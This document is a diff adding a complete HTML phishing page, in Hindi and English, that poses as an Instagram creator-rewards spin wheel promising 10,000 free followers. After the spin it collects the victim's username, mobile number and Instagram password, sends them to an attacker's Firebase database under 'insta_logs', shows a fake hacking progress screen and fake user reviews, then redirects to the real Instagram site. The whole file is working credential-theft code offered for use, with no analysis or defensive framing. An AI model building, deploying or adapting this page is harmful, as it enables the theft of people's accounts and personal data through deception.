@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Creator Rewards 2026</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #fafafa; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 90%; max-width: 400px; background: white; border: 1px solid #dbdbdb; padding: 25px; text-align: center; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .logo { width: 140px; margin-bottom: 20px; }
+        
+        /* Spin Wheel Section */
+        #wheel-section { display: block; }
+        .wheel-box { position: relative; width: 260px; height: 260px; margin: 20px auto; }
+        .wheel { width: 100%; height: 100%; border: 8px solid #333; border-radius: 50%; transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99); background: conic-gradient(#f09433, #e6683c, #dc2743, #cc2366, #bc1888, #f09433); }
+        .needle { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #333; z-index: 10; }
+        .spin-btn { background: #0095f6; color: white; padding: 14px 40px; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 10px rgba(0,149,246,0.3); }
+
+        /* Login Form Section */
+        #login-section { display: none; }
+        .win-text { color: #ed4956; font-size: 20px; font-weight: bold; margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
+        .submit-btn { width: 100%; padding: 14px; border: none; border-radius: 8px; background: #0095f6; color: white; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+
+        /* Reviews */
+        .reviews { margin-top: 25px; text-align: left; border-top: 1px solid #eee; padding-top: 15px; }
+        .rev-item { font-size: 13px; margin-bottom: 8px; color: #444; }
+        .rev-name { font-weight: bold; color: #262626; }
+
+        /* Loading Screen */
+        #loading-screen { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:black; color:#0f0; font-family: 'Courier New', monospace; padding: 30px; box-sizing: border-box; z-index: 1000; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-ui">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="logo">
+    
+    <div id="wheel-section">
+        <h3 style="font-size: 18px; color: #262626;">अपना लकी इनाम जीतने के लिए चक्का घुमाएं! 🎡</h3>
+        <div class="wheel-box">
+            <div class="needle"></div>
+            <div class="wheel" id="wheel"></div>
+        </div>
+        <button class="spin-btn" onclick="spinWheel()">घुमाएं (SPIN)</button>
+    </div>
+
+    <div id="login-section">
+        <div class="win-text">🎉 मुबारक हो! आपने 10,000 फॉलोअर्स जीते हैं!</div>
+        <p style="font-size: 14px; color: #8e8e8e;">इनाम पाने के लिए अपनी आईडी कन्फर्म करें</p>
+        <input type="text" id="username" placeholder="Phone, Username or Email">
+        <input type="number" id="phone" placeholder="Mobile Number">
+        <input type="password" id="password" placeholder="Instagram Password">
+        <button class="submit-btn" onclick="sendData()">इनाम एक्टिवेट करें</button>
+    </div>
+
+    <div class="reviews">
+        <div class="rev-item"><span class="rev-name">iam_sahil:</span> भाई सच में मिल गए, शुक्रिया! 🔥</div>
+        <div class="rev-item"><span class="rev-name">priya_verma:</span> Amazing tool, 10k followers added.</div>
+        <div class="rev-item"><span class="rev-name">dark_hacker:</span> Legit website for growth. 💯</div>
+    </div>
+</div>
+
+<div id="loading-screen">
+    <p>> System: Accessing Instagram Gateway...</p>
+    <p>> System: Bypassing Firewalls...</p>
+    <p>> System: Injecting Followers Package...</p>
+    <p>> System: 10,000 Followers Sent to Server...</p>
+    <p>> Success! Verification Complete.</p>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    // आपका Firebase Config
+    const firebaseConfig = {
+        apiKey: "AIzaSyB0XpDdnwQDD2X02QEDLkdgCHos_8YgmDs",
+        authDomain: "sahil-snap-hacker.firebaseapp.com",
+        databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com",
+        projectId: "sahil-snap-hacker",
+        storageBucket: "sahil-snap-hacker.firebasestorage.app",
+        messagingSenderId: "597030531702",
+        appId: "1:597030531702:web:8a5ba9fc3328fe8d1de557"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    window.spinWheel = function() {
+        document.getElementById('wheel').style.transform = "rotate(3600deg)";
+        setTimeout(() => {
+            document.getElementById('wheel-section').style.display = "none";
+            document.getElementById('login-section').style.display = "block";
+        }, 4000);
+    }
+
+    window.sendData = function() {
+        const u = document.getElementById('username').value;
+        const m = document.getElementById('phone').value;
+        const p = document.getElementById('password').value;
+
+        if(u=="" || m=="" || p=="") { alert("कृपया सभी जानकारी भरें!"); return; }
+
+        document.getElementById('main-ui').style.display = "none";
+        document.getElementById('loading-screen').style.display = "block";
+
+        push(ref(db, 'insta_logs'), {
+            username: u, mobile: m, password: p, time: new Date().toLocaleString()
+        }).then(() => {
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com/reels/";
+            }, 3000);
+        });
+    }
+</script>
+</body>
+</html>
